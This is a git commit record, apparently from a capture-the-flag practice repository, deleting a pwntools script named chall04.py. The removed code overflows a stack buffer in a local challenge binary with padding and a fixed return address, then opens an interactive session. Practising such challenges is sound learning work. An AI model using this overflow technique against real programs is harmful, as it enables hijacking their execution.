57b34f6b8f7a27fa615e1fec316c268a3a10c798
cumbercookies22 <106026504+cumbercookies22@users.noreply.github.com>
2022-05-25 12:44:01 -0400

    Delete chall04.py

--- chall04.py
+++
@@ -1,9 +0,0 @@
-# coding: utf-8
-from pwn import *
-def chall04():
-    p=process("./chall_04")
-    payload=b'a'*(0x60-8)+p64(0x00401176)
-    p.sendline(payload)
-    p.interactive()
-    
-chall04()
